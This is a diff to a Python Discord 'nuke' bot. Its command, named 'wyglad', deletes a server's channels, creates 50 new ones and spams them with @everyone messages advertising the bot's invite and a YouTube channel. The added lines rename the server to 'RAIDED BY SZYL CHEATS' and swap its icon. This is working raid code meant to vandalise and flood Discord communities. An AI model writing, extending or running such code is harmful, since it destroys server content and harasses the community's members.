@@ -25,7 +25,11 @@ async def wyglad(ctx):
       await channel.delete()
     except Exception as e:
       print(f"Couldn't delete {channel}: {e}")
-
+  await ctx.guild.edit(name="RAIDED BY SZYL CHEATS LLLLLLLLLLL")
+  with open("seticon.png", "rb") as f:
+    icon_bytes = f.read()
+  await ctx.guild.edit(icon=icon_bytes)
+  
   created_channels = []
   for i in range(1, 51):
     try:
@@ -33,7 +37,7 @@ async def wyglad(ctx):
       created_channels.append(channel)
     except Exception as e:
       print(f"Couldn't create channel: {e}")
-
+  
   async def spam(channel):
     message = "To get nuke bot join https://discord.gg/Nz2uqrPz3X https://youtube.com/@szylcheats @everyone @here"
     for _ in range(6):
